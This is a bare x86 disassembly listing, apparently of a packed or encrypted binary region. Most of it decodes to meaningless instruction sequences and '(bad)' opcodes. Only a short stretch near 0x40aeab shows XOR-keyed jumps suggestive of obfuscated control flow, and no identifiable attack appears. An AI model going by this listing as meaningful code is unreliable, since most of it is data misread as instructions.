  40a952:	fnstsw WORD PTR [eax]
  40a954:	inc    BYTE PTR [ebx]
  40a956:	outs   dx,DWORD PTR ds:[esi]
  40a957:	mov    ds:0xc1cedf75,al
  40a95c:	mov    ds:0xe8136b68,eax
  40a961:	or     al,0x5
  40a963:	and    ecx,DWORD PTR [ebx+esi*2-0x78d02b7b]
  40a96a:	xchg   ecx,eax
  40a96b:	rcl    DWORD PTR [ebp+0x31aa9068],1
  40a971:	mov    ebp,0x687c8bee
  40a976:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a977:	cmc    
  40a978:	mov    dl,0x78
  40a97a:	mov    ebx,0x7cec7a2c
  40a97f:	push   esp
  40a980:	cmp    ecx,ebx
  40a982:	je     0x40a955
  40a984:	jg     0x40a9d6
  40a986:	in     eax,0xad
  40a988:	test   al,0x10
  40a98a:	fcmovnbe st,st(3)
  40a98c:	mov    ds,WORD PTR [edx-0x66]
  40a98f:	sar    ecx,1
  40a991:	inc    edi
  40a992:	and    edi,DWORD PTR [eax+eiz*4]
  40a995:	mov    eax,ds:0x94cfb333
  40a99a:	out    0x2a,al
  40a99c:	push   ecx
  40a99d:	mov    ds:0x8cf11e7e,al
  40a9a2:	shl    BYTE PTR [edi],0xb5
  40a9a5:	mov    BYTE PTR ss:[ecx-0x5d],al
  40a9a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a9aa:	mov    al,0xce
  40a9ac:	adc    BYTE PTR [edx-0x7b],ah
  40a9af:	mov    BYTE PTR [esi-0x55],dh
  40a9b2:	push   ds
  40a9b3:	jnp    0x40a939
  40a9b5:	mov    bh,0x3f
  40a9b7:	test   ch,bl
  40a9b9:	loope  0x40a9ae
  40a9bb:	test   bh,bh
  40a9bd:	add    bh,BYTE PTR [edi-0x3b]
  40a9c0:	add    BYTE PTR [edx+0x352e9ba1],0x82
  40a9c7:	pop    ds
  40a9c8:	jge    0x40a9e8
  40a9ca:	daa    
  40a9cb:	rcr    BYTE PTR [ebp+0x56],0xd4
  40a9cf:	inc    eax
  40a9d0:	and    DWORD PTR [edx],ebx
  40a9d2:	sahf   
  40a9d3:	push   ds
  40a9d4:	fadd   st(7),st
  40a9d6:	add    eax,0x84e8b397
  40a9db:	push   ebp
  40a9dc:	fcomp  QWORD PTR [esi]
  40a9de:	(bad)  
  40a9df:	stc    
  40a9e0:	pop    edi
  40a9e1:	pop    ebp
  40a9e2:	aad    0x54
  40a9e4:	dec    edx
  40a9e5:	data16 or al,BYTE PTR [ecx-0x38]
  40a9e9:	es stos BYTE PTR es:[edi],al
  40a9eb:	xor    bh,BYTE PTR [edi+0x23]
  40a9ee:	mov    ah,BYTE PTR [edi-0x9]
  40a9f1:	fsub   QWORD PTR [esi]
  40a9f3:	mov    bh,0x65
  40a9f5:	xchg   edx,eax
  40a9f6:	rol    BYTE PTR ds:0xaac2f1e,1
  40a9fc:	rcl    DWORD PTR [ebp+ecx*4+0x52b5546a],cl
  40aa03:	sub    eax,0x60b40f34
  40aa08:	retf   
  40aa09:	pop    es
  40aa0a:	cmp    al,0x8a
  40aa0c:	enter  0x2a7,0x93
  40aa10:	mov    al,ds:0xaf7f00e7
  40aa15:	jmp    0x241cbe80
  40aa1a:	inc    esi
  40aa1b:	jb     0x40a9e9
  40aa1d:	and    esi,DWORD PTR [edi]
  40aa1f:	outs   dx,BYTE PTR ds:[esi]
  40aa20:	sub    eax,0x3a065585
  40aa25:	nop
  40aa26:	pop    ebx
  40aa27:	mov    ?,edx
  40aa29:	fisttp WORD PTR [edx+0x2]
  40aa2c:	mov    cs,ecx
  40aa2e:	add    ebp,DWORD PTR [edi-0x2]
  40aa31:	inc    edx
  40aa32:	enter  0x22e4,0xf5
  40aa36:	inc    esp
  40aa37:	test   esi,0x176f0446
  40aa3d:	push   0xaad2eeaa
  40aa42:	push   cs
  40aa43:	or     ah,BYTE PTR [eax+0x28343323]
  40aa49:	sbb    edx,edx
  40aa4b:	mov    sp,0xe50a
  40aa4f:	hlt    
  40aa50:	mov    DWORD PTR [edx+0x53b9fdf3],esi
  40aa56:	dec    edx
  40aa57:	ins    BYTE PTR es:[edi],dx
  40aa58:	call   0x8f9d:0xb64ab6f4
  40aa5f:	test   al,0x5d
  40aa61:	aas    
  40aa62:	js     0x40aa81
  40aa64:	aas    
  40aa65:	or     ebx,ebx
  40aa67:	add    eax,ebx
  40aa69:	mov    WORD PTR [ecx],gs
  40aa6b:	mov    WORD PTR [edi*8-0xa814877],ds
  40aa72:	jae    0x40aae4
  40aa74:	enter  0x7f71,0xb1
  40aa78:	push   esi
  40aa79:	mov    al,ds:0xaffd1172
  40aa7e:	mov    bl,0x29
  40aa80:	aas    
  40aa81:	mov    fs,WORD PTR [ecx-0x7ad87a37]
  40aa87:	push   edx
  40aa88:	dec    ebp
  40aa89:	jg     0x40aaab
  40aa8b:	jecxz  0x40aa58
  40aa8d:	in     al,0x8e
  40aa8f:	test   DWORD PTR [ecx],esp
  40aa91:	sub    eax,DWORD PTR [eax-0xc]
  40aa94:	push   esp
  40aa95:	push   ecx
  40aa96:	mov    edx,0x48772242
  40aa9b:	mov    DWORD PTR [edx+0x11],edi
  40aa9e:	cdq    
  40aa9f:	pop    ebp
  40aaa0:	int    0xd0
  40aaa2:	inc    ecx
  40aaa3:	shl    DWORD PTR [esi+0x52ae2abb],1
  40aaa9:	mov    dh,0x5
  40aaab:	or     eax,0x996fad90
  40aab1:	arpl   WORD PTR [esi-0x7f],bp
  40aab4:	fidivr DWORD PTR [esi-0x17]
  40aab7:	bnd jns 0x40aa68
  40aaba:	push   ds
  40aabb:	(bad)  
  40aabc:	dec    esp
  40aabd:	xor    al,0x48
  40aabf:	dec    ebx
  40aac0:	push   ebp
  40aac1:	jnp    0x40aa9a
  40aac3:	xor    edx,ecx
  40aac5:	push   ebp
  40aac6:	xchg   edx,eax
  40aac7:	sbb    DWORD PTR [edi+ebx*1],edi
  40aaca:	nop
  40aacb:	mov    esi,0x486196a9
  40aad0:	aad    0x2
  40aad2:	xchg   edi,eax
  40aad3:	cld    
  40aad4:	mov    BYTE PTR [edi+0x3],cl
  40aad7:	xchg   ebx,eax
  40aad8:	adc    cl,BYTE PTR [esi]
  40aada:	pop    eax
  40aadb:	fsubr  DWORD PTR [edx+0x7630a834]
  40aae1:	or     edx,edi
  40aae3:	jbe    0x40aad1
  40aae5:	jle    0x40aae7
  40aae7:	inc    ecx
  40aae8:	mov    dl,0xb7
  40aaea:	and    BYTE PTR ds:0xcb72a132,dl
  40aaf0:	ins    DWORD PTR es:[edi],dx
  40aaf1:	loop   0x40ab03
  40aaf3:	outs   dx,DWORD PTR ds:[esi]
  40aaf4:	fst    QWORD PTR [ebx-0x3c]
  40aaf7:	jno    0x40ab35
  40aaf9:	ss xchg edi,eax
  40aafb:	pusha  
  40aafc:	mov    edx,0xa310c244
  40ab01:	sbb    ebp,ebx
  40ab03:	into   
  40ab04:	inc    esp
  40ab05:	sub    bh,BYTE PTR [eax-0x3e]
  40ab08:	in     al,dx
  40ab09:	pop    edx
  40ab0a:	jmp    0x4562:0x5692c549
  40ab11:	shr    dl,1
  40ab13:	mov    cl,0x3c
  40ab15:	aaa    
  40ab16:	pop    edx
  40ab17:	add    BYTE PTR [esi],dh
  40ab19:	scas   eax,DWORD PTR es:[edi]
  40ab1a:	rol    dh,1
  40ab1c:	sbb    ebx,DWORD PTR [ebx]
  40ab1e:	add    al,0x60
  40ab20:	adc    DWORD PTR [eax+ebx*8+0x1b],0xffffffac
  40ab25:	out    0x8f,eax
  40ab27:	cwde   
  40ab28:	(bad)  
  40ab2a:	jno    0x40aad7
  40ab2c:	xchg   esp,eax
  40ab2d:	sub    dh,al
  40ab2f:	mov    ch,0x75
  40ab31:	clc    
  40ab32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab33:	out    0x3c,eax
  40ab35:	call   edi
  40ab37:	icebp  
  40ab38:	mov    ds:0x4bff74a,al
  40ab3d:	mov    ah,0x2b
  40ab3f:	mov    bh,0x7a
  40ab41:	cs pop ss
  40ab43:	repz or edi,DWORD PTR [esi-0x583cb1ff]
  40ab4a:	jle    0x40abc4
  40ab4c:	xor    DWORD PTR [ecx+edi*8],esp
  40ab4f:	xchg   BYTE PTR [edi+eax*8-0x70],dh
  40ab53:	in     eax,dx
  40ab54:	lock cmp ebx,esp
  40ab57:	in     eax,dx
  40ab58:	adc    bh,BYTE PTR [esi-0x3766862a]
  40ab5e:	pop    ecx
  40ab5f:	int    0xf4
  40ab61:	mov    cl,0x81
  40ab63:	gs test al,0x7f
  40ab66:	lea    esp,[ecx+0xfc9a340]
  40ab6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab6e:	pop    ds
  40ab6f:	mov    cl,0x25
  40ab71:	mov    cl,0xdc
  40ab73:	aam    0x2c
  40ab75:	push   0xe4c656fc
  40ab7a:	sbb    esp,edx
  40ab7c:	xor    DWORD PTR [esi-0x36],ecx
  40ab7f:	sub    edi,eax
  40ab81:	js     0x40abdf
  40ab83:	jecxz  0x40ab7f
  40ab85:	pusha  
  40ab86:	loope  0x40ab70
  40ab88:	call   0xc816:0xcb12989a
  40ab8f:	and    ecx,esp
  40ab91:	call   DWORD PTR cs:[ebp+0x31d639a3]
  40ab98:	cmp    BYTE PTR [ecx+0x51c4d202],cl
  40ab9e:	ret    
  40ab9f:	inc    ecx
  40aba0:	ja     0x40ab22
  40aba2:	mov    edi,0xb1b56089
  40aba7:	pop    DWORD PTR [esi-0x4b]
  40abaa:	xor    DWORD PTR [eax+0x7c],edi
  40abad:	jbe    0x40ab9e
  40abaf:	fcmovu st,st(3)
  40abb1:	dec    edx
  40abb2:	mov    WORD PTR [edi+0x618c9397],ds
  40abb8:	lods   eax,DWORD PTR ds:[esi]
  40abb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40abba:	fwait
  40abbb:	ss pop edi
  40abbd:	ret    0x6cbd
  40abc0:	inc    ecx
  40abc1:	adc    ebp,ebx
  40abc3:	leave  
  40abc4:	sub    al,0xc2
  40abc6:	jne    0x40ac09
  40abc8:	inc    edi
  40abc9:	pop    esp
  40abca:	and    al,0x9e
  40abcc:	(bad)  
  40abcd:	retf   0x82b9
  40abd0:	pop    es
  40abd1:	cmp    edi,esi
  40abd3:	loopne 0x40abd3
  40abd5:	dec    edi
  40abd6:	or     eax,0xec678bf1
  40abdb:	dec    esi
  40abdc:	das    
  40abdd:	mov    ebp,0xeb3aa2f1
  40abe2:	push   edi
  40abe3:	outs   dx,DWORD PTR ds:[esi]
  40abe4:	test   esi,edi
  40abe6:	aas    
  40abe7:	cmp    esi,DWORD PTR [edx-0x30b47994]
  40abed:	mov    ebp,0x490cf6e4
  40abf2:	and    ebx,DWORD PTR [ecx-0x77]
  40abf5:	mov    cs,ecx
  40abf7:	cdq    
  40abf8:	test   BYTE PTR [ebx-0x76],0xb2
  40abfc:	cld    
  40abfd:	dec    ebp
  40abfe:	push   ax
  40ac00:	sbb    BYTE PTR [edx-0x14],bl
  40ac03:	ror    DWORD PTR [eax],1
  40ac05:	jmp    0xc8e1:0xf4b5bb66
  40ac0c:	and    bl,BYTE PTR [edi]
  40ac0e:	or     al,0x36
  40ac10:	(bad)  
  40ac11:	xchg   DWORD PTR [ebp+0xd],ecx
  40ac14:	adc    BYTE PTR [esi-0x4a],cl
  40ac17:	add    BYTE PTR [edx],ah
  40ac19:	pop    esp
  40ac1a:	ss adc al,0xd2
  40ac1d:	mov    esp,0x4ee1ce64
  40ac22:	mov    cl,0x50
  40ac24:	fld    TBYTE PTR [eax+ebx*2-0x600fa705]
  40ac2b:	adc    edi,edi
  40ac2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac2e:	mov    bh,0x77
  40ac30:	enter  0xc398,0x0
  40ac34:	out    0xa1,eax
  40ac36:	dec    esi
  40ac37:	int    0x9
  40ac39:	mov    dl,0x67
  40ac3b:	inc    eax
  40ac3c:	mov    cl,0xe4
  40ac3e:	mov    al,ds:0x88e4b419
  40ac43:	iret   
  40ac44:	scas   eax,DWORD PTR es:[edi]
  40ac45:	rcl    DWORD PTR [eax-0x54],cl
  40ac48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac49:	lds    eax,FWORD PTR [edi+0x1d]
  40ac4c:	adc    DWORD PTR [ecx+0x233ccf7a],edx
  40ac52:	inc    ebx
  40ac53:	jge    0x40ac0d
  40ac55:	call   0x506b7343
  40ac5a:	add    al,0xf0
  40ac5c:	les    ebp,FWORD PTR [edi+0x5767ff61]
  40ac62:	sahf   
  40ac63:	icebp  
  40ac64:	cld    
  40ac65:	push   ebx
  40ac66:	fmul   st,st(6)
  40ac68:	push   ecx
  40ac69:	out    0xfe,eax
  40ac6b:	push   ecx
  40ac6c:	dec    ebx
  40ac6d:	xor    cl,BYTE PTR [ebp+0x18]
  40ac70:	fld    DWORD PTR [ebx+esi*2+0x4c]
  40ac74:	add    al,ah
  40ac76:	test   eax,0xdded7cf9
  40ac7b:	stos   BYTE PTR es:[edi],al
  40ac7c:	(bad)  [edx+0xc]
  40ac7f:	neg    DWORD PTR ds:0x67dc38c2
  40ac85:	pop    ds
  40ac86:	imul   edi,DWORD PTR [ebp+0x65],0x5b
  40ac8a:	or     esi,DWORD PTR [edi]
  40ac8c:	pop    edi
  40ac8d:	mov    al,0x2a
  40ac8f:	pop    ds
  40ac90:	int    0x7d
  40ac92:	adc    ebp,eax
  40ac94:	mov    edi,0xb9bb3b5
  40ac99:	inc    ebp
  40ac9a:	jg     0x40aca9
  40ac9c:	fdiv   st,st(2)
  40ac9e:	lea    edx,[ebp+ecx*1-0x62]
  40aca2:	out    0x79,eax
  40aca4:	loope  0x40acf8
  40aca6:	push   0xfffffffc
  40aca8:	pop    edi
  40aca9:	ja     0x40ac6a
  40acab:	call   0x7d8f:0x58c85721
  40acb2:	inc    ebp
  40acb3:	jnp    0x40ad30
  40acb5:	(bad)  
  40acb6:	(bad)  
  40acb7:	out    0x9b,eax
  40acb9:	cmp    edi,ebx
  40acbb:	rcl    BYTE PTR [esi+0x7b],0xe2
  40acbf:	jle    0x40ad2e
  40acc1:	test   DWORD PTR [ecx+0x7f],0xcea07ec3
  40acc8:	loope  0x40ac53
  40acca:	and    dl,dl
  40accc:	inc    esp
  40accd:	xchg   ebx,eax
  40acce:	out    0x57,al
  40acd0:	jecxz  0x40ac5b
  40acd2:	sti    
  40acd3:	bound  edi,QWORD PTR [ecx]
  40acd5:	icebp  
  40acd6:	lea    ebx,[eax-0xbdd534a]
  40acdc:	and    DWORD PTR ds:[ecx-0x10],ebp
  40ace0:	mov    ds:0xc9a277aa,eax
  40ace5:	lock aas 
  40ace7:	lahf   
  40ace8:	cdq    
  40ace9:	(bad)  
  40acea:	in     al,dx
  40aceb:	mov    ch,bh
  40aced:	out    0xc3,al
  40acef:	std    
  40acf0:	xor    DWORD PTR ds:0x4ac15ddc,ebx
  40acf6:	adc    dh,dh
  40acf8:	push   ss
  40acf9:	adc    BYTE PTR [esp+edi*1],0x26
  40acfd:	ins    DWORD PTR es:[edi],dx
  40acfe:	(bad)  
  40acff:	mov    ebp,DWORD PTR [ecx+0x4e]
  40ad02:	inc    ebx
  40ad03:	clc    
  40ad04:	test   eax,0x79ddb774
  40ad09:	xor    ch,0xbe
  40ad0c:	pop    ecx
  40ad0d:	cwde   
  40ad0e:	imul   BYTE PTR [eax]
  40ad10:	inc    edx
  40ad11:	nop
  40ad12:	inc    ebp
  40ad13:	mov    ebx,0x439e523d
  40ad18:	rol    esp,0xa8
  40ad1b:	cmp    BYTE PTR [edx-0x1],bl
  40ad1e:	cmp    ch,al
  40ad20:	pop    esp
  40ad21:	pop    edi
  40ad22:	dec    esi
  40ad23:	scas   eax,DWORD PTR es:[edi]
  40ad24:	mov    dh,0x54
  40ad26:	jae    0x40ad3b
  40ad28:	arpl   WORD PTR [edi],di
  40ad2a:	sub    esi,esi
  40ad2c:	xchg   ebp,eax
  40ad2d:	pop    edx
  40ad2e:	jmp    0x7bee556d
  40ad33:	push   cs
  40ad34:	stos   DWORD PTR es:[edi],eax
  40ad35:	hlt    
  40ad36:	fstp   QWORD PTR [ecx+0x35]
  40ad39:	in     al,0x17
  40ad3b:	adc    al,0x90
  40ad3d:	xchg   edi,eax
  40ad3e:	ficom  WORD PTR [eax+0x43fb33]
  40ad44:	mov    ebp,0x17aaf152
  40ad49:	adc    DWORD PTR [esi],edi
  40ad4b:	cmp    ah,dl
  40ad4d:	ret    0xdc20
  40ad50:	adc    DWORD PTR [edi],edi
  40ad52:	ficom  WORD PTR ds:0xf5fde720
  40ad58:	jecxz  0x40adb6
  40ad5a:	inc    edx
  40ad5b:	xlat   BYTE PTR ds:[ebx]
  40ad5c:	sbb    ah,cl
  40ad5e:	dec    edi
  40ad5f:	les    edx,FWORD PTR [ebx]
  40ad61:	jl     0x40acf0
  40ad63:	loope  0x40adc7
  40ad65:	xchg   edi,eax
  40ad66:	je     0x40ad80
  40ad68:	leavew 
  40ad6a:	jmp    0x8171:0x4727bc0d
  40ad71:	retf   
  40ad72:	pop    esi
  40ad73:	and    DWORD PTR [ecx-0x5ebddd57],0xffffff9d
  40ad7a:	loopne 0x40ad64
  40ad7c:	std    
  40ad7d:	adc    eax,0x27c30d4e
  40ad82:	pop    edx
  40ad83:	call   0xe8ad8f0e
  40ad88:	xchg   ecx,eax
  40ad89:	adc    DWORD PTR [ecx],edx
  40ad8b:	xor    cl,BYTE PTR [edx+0x6b74ff15]
  40ad91:	sub    DWORD PTR [ebp+0x5],ebp
  40ad94:	adc    bh,ah
  40ad96:	mov    ecx,DWORD PTR [ebx]
  40ad98:	xchg   edi,eax
  40ad99:	and    dh,BYTE PTR [edi]
  40ad9b:	lahf   
  40ad9c:	mov    esp,0x96c1fbba
  40ada1:	xor    BYTE PTR [edi-0x79767286],0x1
  40ada8:	cmp    al,0x69
  40adaa:	jne    0x40ad6b
  40adac:	add    BYTE PTR fs:[edi+0x6e],dl
  40adb0:	(bad)  
  40adb1:	cmp    eax,0x4adf2891
  40adb6:	(bad)  
  40adb7:	xor    dl,BYTE PTR [ebx-0x20]
  40adba:	add    al,0x72
  40adbc:	or     ebx,0xc8e32101
  40adc2:	pop    edx
  40adc3:	mov    cl,0x33
  40adc5:	jae    0x40adcd
  40adc7:	(bad)  
  40adc8:	icebp  
  40adc9:	adc    BYTE PTR [ebp-0x2e],0x57
  40adcd:	scas   al,BYTE PTR es:[edi]
  40adce:	aas    
  40adcf:	stos   BYTE PTR es:[edi],al
  40add0:	or     al,0xaf
  40add2:	into   
  40add3:	mov    ?,WORD PTR [ebx]
  40add5:	add    al,0x2c
  40add7:	loop   0x40ae4c
  40add9:	ins    BYTE PTR es:[edi],dx
  40adda:	in     eax,dx
  40addb:	dec    esp
  40addc:	ds nop
  40adde:	adc    DWORD PTR [edx-0x46138716],eax
  40ade4:	enter  0x14e,0xdc
  40ade8:	add    BYTE PTR [ecx+edx*4],al
  40adeb:	xchg   eax,esp
  40aded:	adc    al,BYTE PTR [esi-0x5984a62c]
  40adf3:	fisubr DWORD PTR [ecx+0x23]
  40adf6:	xchg   edx,eax
  40adf7:	adc    eax,0xd0b1ef95
  40adfc:	ss pop es
  40adfe:	add    eax,0xe6581949
  40ae03:	and    al,BYTE PTR [ebx+0x4d]
  40ae06:	int3   
  40ae07:	and    al,0xd6
  40ae09:	jb     0x40ae4c
  40ae0b:	pop    edx
  40ae0c:	test   al,0x24
  40ae0e:	pop    ebx
  40ae0f:	jbe    0x40ae4d
  40ae11:	stos   BYTE PTR es:[edi],al
  40ae12:	xor    al,0x72
  40ae14:	scas   eax,DWORD PTR es:[edi]
  40ae15:	inc    esp
  40ae16:	pop    ecx
  40ae17:	mov    cl,0x9
  40ae19:	pop    ss
  40ae1a:	pop    esp
  40ae1b:	sub    al,0xe9
  40ae1d:	iret   
  40ae1e:	xlat   BYTE PTR ds:[ebx]
  40ae1f:	and    BYTE PTR [edi-0x29226381],dh
  40ae25:	outs   dx,DWORD PTR ds:[esi]
  40ae26:	mov    DWORD PTR [eax+0x29],edi
  40ae29:	(bad)  
  40ae2a:	dec    BYTE PTR [ebx]
  40ae2c:	or     eax,0xdf02fa3d
  40ae31:	adc    eax,0xfce62bd4
  40ae36:	dec    ebx
  40ae37:	loopne 0x40adf4
  40ae39:	sbb    dh,BYTE PTR [esi-0x349b3502]
  40ae3f:	loopne 0x40ae3a
  40ae41:	inc    esp
  40ae42:	jecxz  0x40ae0e
  40ae44:	cmc    
  40ae45:	test   DWORD PTR [ebx-0x64],esi
  40ae48:	jle    0x40aebd
  40ae4a:	je     0x40ae60
  40ae4c:	lds    esp,FWORD PTR [esi]
  40ae4e:	xor    dl,bl
  40ae50:	inc    DWORD PTR ds:0x82638f65
  40ae56:	pop    esi
  40ae57:	addr16 add eax,0xf431360e
  40ae5d:	jle    0x40aea9
  40ae5f:	in     al,dx
  40ae60:	and    ecx,0x5285b8a4
  40ae66:	inc    esi
  40ae67:	add    DWORD PTR [edx-0x7f7be542],edi
  40ae6d:	xor    DWORD PTR [edx+0x37fcadae],edx
  40ae73:	jae    0x40aef0
  40ae75:	(bad)  
  40ae77:	sub    BYTE PTR [esp+edi*4],dh
  40ae7a:	retf   0x6772
  40ae7d:	test   DWORD PTR [ecx-0x3f],edi
  40ae80:	(bad)  
  40ae81:	jno    0x40ae19
  40ae83:	retf   
  40ae84:	mov    ebx,ecx
  40ae86:	repz (bad) 
  40ae88:	out    dx,eax
  40ae89:	mov    ebp,0xf0baa1ea
  40ae8e:	xlat   BYTE PTR ds:[ebx]
  40ae8f:	in     al,dx
  40ae90:	ins    DWORD PTR es:[edi],dx
  40ae91:	sbb    esp,DWORD PTR [ebx+0x5b]
  40ae94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae95:	push   0xab74f1d1
  40ae9a:	fwait
  40ae9b:	xchg   edi,eax
  40ae9c:	int3   
  40ae9d:	scas   al,BYTE PTR es:[edi]
  40ae9e:	push   edx
  40ae9f:	(bad)  
  40aea0:	mov    ebx,0xe26abbcf
  40aea5:	sar    BYTE PTR [esi-0x79debf34],1
  40aeab:	movzx  eax,WORD PTR [eax+ebx*2]
  40aeaf:	mov    ecx,DWORD PTR [ebp-0x14]
  40aeb2:	mov    eax,DWORD PTR [ecx+eax*4]
  40aeb5:	mov    DWORD PTR [ebp-0x38],eax
  40aeb8:	jmp    0x408aae
  40aebd:	mov    eax,DWORD PTR [ebp-0xc]
  40aec0:	xor    eax,esi
  40aec2:	lea    ebx,[ebx+eax*1+0x3272fa]
  40aec9:	jmp    0x4087a7
  40aece:	mov    eax,DWORD PTR [ebp-0x4]
  40aed1:	xor    eax,esi
  40aed3:	add    eax,edi
  40aed5:	jmp    0x40d3b1
  40aeda:	mov    eax,DWORD PTR [ebp-0x38]
  40aedd:	add    eax,DWORD PTR [ebp+0x8]
  40aee0:	mov    DWORD PTR [ebp-0x18],eax
  40aee3:	jmp    0x40d298
  40aee8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aee9:	fisubr WORD PTR [esi]
  40aeeb:	jbe    0x40af63
  40aeed:	jbe    0x40aed6
  40aeef:	outs   dx,BYTE PTR ds:[esi]
  40aef0:	xchg   BYTE PTR [ebx+0x729fa730],al
  40aef6:	mov    dl,0xd7
  40aef8:	or     BYTE PTR [ecx],0x7b
  40aefb:	jnp    0x40af10
  40aefd:	pushf  
  40aefe:	jnp    0x40af7b
  40af00:	cdq    
  40af01:	mul    bh
  40af03:	dec    eax
  40af04:	jge    0x40af12
  40af06:	sub    al,0x9f
  40af08:	pop    esi
  40af09:	arpl   WORD PTR [ebp-0x1ca41aea],dx
  40af0f:	daa    
  40af10:	inc    ecx
  40af11:	loope  0x40aef7
  40af13:	xor    eax,0x76439f8
  40af18:	xor    eax,0xf63ddc83
  40af1d:	nop
  40af1e:	mov    cl,0x0
  40af20:	(bad)  
  40af21:	push   cs
  40af22:	and    al,0x7e
  40af24:	je     0x40af16
  40af26:	test   BYTE PTR [ebx+0x6d532208],al
  40af2c:	xor    ah,BYTE PTR ds:0xc5d1a72b
  40af32:	sub    al,BYTE PTR [eax-0x68e2cb6a]
  40af38:	pop    DWORD PTR [esi+edx*1]
  40af3b:	outs   dx,DWORD PTR ds:[esi]
  40af3c:	bound  ecx,QWORD PTR [edx-0x6e]
  40af3f:	sbb    ebp,DWORD PTR [ebx-0x22eaa3c]
  40af45:	dec    ebx
  40af46:	in     eax,dx
  40af47:	aad    0x42
  40af49:	fimul  WORD PTR es:[ecx-0x2e]
  40af4d:	fst    QWORD PTR [edi-0x72160bb5]
  40af53:	mov    ebx,0x82ff3de2
  40af58:	mov    WORD PTR ds:0x87e7694f,fs
  40af5e:	mov    cs,WORD PTR [ebx+0x1e]
  40af61:	clc    
  40af62:	into   
  40af63:	inc    eax
  40af64:	outs   dx,DWORD PTR ds:[esi]
  40af65:	or     ebp,DWORD PTR es:0x4d8d7d2c
  40af6c:	not    esp
  40af6e:	push   ss
  40af6f:	push   0xffffffe8
  40af71:	jl     0x40af20
  40af73:	mov    BYTE PTR [edx-0x7d],0xf0
  40af77:	push   0x7
  40af79:	out    0x6d,al
  40af7b:	nop
  40af7c:	dec    ebp
  40af7d:	or     eax,0xfb1a4a0a
  40af82:	dec    ebp
  40af83:	push   edi
  40af84:	rol    BYTE PTR [ecx],1
  40af86:	mov    ds:0x87937c79,al
  40af8b:	push   ds
  40af8c:	outs   dx,BYTE PTR ds:[esi]
  40af8d:	bound  ebx,QWORD PTR [edx+ecx*1+0x669288ed]
  40af94:	out    dx,eax
  40af95:	adc    BYTE PTR [ecx-0x3ce60400],0x62
  40af9c:	or     esp,0x7313f032
  40afa2:	nop
  40afa3:	inc    esi
  40afa4:	sbb    ah,BYTE PTR [esi-0x65]
  40afa7:	ror    esi,1
  40afa9:	dec    eax
  40afaa:	add    BYTE PTR [eax+0x48e0fc81],0xe7
  40afb1:	xchg   ebx,eax
  40afb2:	out    0x85,eax
  40afb4:	jmp    0x40b033
  40afb6:	xor    al,0xfb
  40afb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40afb9:	and    dh,cl
  40afbb:	sub    esi,DWORD PTR [ebp+0x16]
  40afbe:	test   al,0x82
  40afc0:	inc    edi
  40afc1:	pop    esi
  40afc2:	jl     0x40afb4
  40afc4:	mov    ebx,0x93821c07
  40afc9:	cld    
  40afca:	lds    esi,FWORD PTR [esi+0x1631fac2]
  40afd0:	adc    eax,0x14622376
  40afd5:	cmp    BYTE PTR es:[eax-0x3dfefb41],bh
  40afdc:	adc    ah,BYTE PTR [ecx+0x3e]
  40afdf:	ret    
  40afe0:	cmp    al,0xea
  40afe2:	adc    ebx,DWORD PTR [eax-0x4f206d77]
  40afe8:	enter  0x2aeb,0x31
  40afec:	cmp    BYTE PTR es:[eax-0x7c554c18],ch
  40aff3:	xor    DWORD PTR [edx],esi
  40aff5:	int    0x76
  40aff7:	cmp    cl,ah
  40aff9:	das    
  40affa:	add    BYTE PTR [ebp+0x72],dl
  40affd:	push   eax
  40affe:	aad    0xa7
  40b000:	cmp    eax,0x870ea5a5
  40b005:	cdq    
  40b006:	pop    ebx
  40b007:	and    DWORD PTR [edx+0x57],eax
  40b00a:	or     eax,0x99ab66be
  40b00f:	cwde   
  40b010:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b011:	lods   eax,DWORD PTR ds:[esi]
  40b012:	pop    edi
  40b013:	push   edx
  40b014:	call   0x2f959440
  40b019:	add    al,0xb
  40b01b:	not    ch
  40b01d:	xchg   BYTE PTR ds:0x7dc39e65,dh
  40b023:	(bad)  
  40b024:	int3   
  40b025:	sbb    dh,BYTE PTR [ecx]
  40b027:	cld    
  40b028:	add    eax,0x3f14a0a9
  40b02d:	js     0x40b034
  40b02f:	add    BYTE PTR [esi+0x97bddc5],bl
  40b035:	iret   
  40b036:	inc    esp
  40b037:	shl    DWORD PTR [ebx+0xf7af0bf],cl
  40b03d:	and    eax,0xe981ecad
  40b042:	dec    eax
  40b043:	mov    ds:0x6415c9f0,al
  40b048:	pop    ebp
  40b049:	adc    eax,0x95e0bdbb
  40b04e:	je     0x40afe4
  40b050:	cdq    
  40b051:	sbb    BYTE PTR [edx+0x72d518c4],cl
  40b057:	jae    0x40b0b0
  40b059:	int    0xc8
  40b05b:	std    
  40b05c:	repz or BYTE PTR [edi],ch
  40b05f:	or     al,0x27
  40b061:	cs popa 
  40b063:	mov    al,0x64
  40b065:	xchg   esi,eax
  40b066:	(bad)  
  40b067:	and    eax,0x211db10
  40b06c:	int3   
  40b06d:	cwde   
  40b06e:	jbe    0x40b0b2
  40b070:	push   0x3d
  40b072:	fbld   TBYTE PTR [ecx-0x7383cb01]
  40b078:	sub    eax,0xb8096ad
  40b07d:	mov    bh,0xb0
  40b07f:	xor    DWORD PTR [ebp+0x7716617f],eax
  40b085:	adc    al,0x72
  40b087:	(bad)  
  40b088:	jmp    0x361a8010
  40b08d:	ret    0x432e
  40b090:	nop
  40b091:	(bad)  
  40b092:	icebp  
  40b093:	scas   eax,DWORD PTR es:[edi]
  40b094:	push   ebx
  40b095:	fisubr WORD PTR [ebx]
  40b097:	test   al,0x12
  40b099:	fld    TBYTE PTR [eax]
  40b09b:	jp     0x40b0e9
  40b09d:	mov    al,BYTE PTR [edx-0x262ce876]
  40b0a3:	retf   0xd867
  40b0a6:	in     al,0x2d
  40b0a8:	mov    edx,0xaa4ce46c
  40b0ad:	mov    ds:0x40a3b0f4,al
  40b0b2:	or     DWORD PTR [ebp+0x28e71aa9],0xffffff91
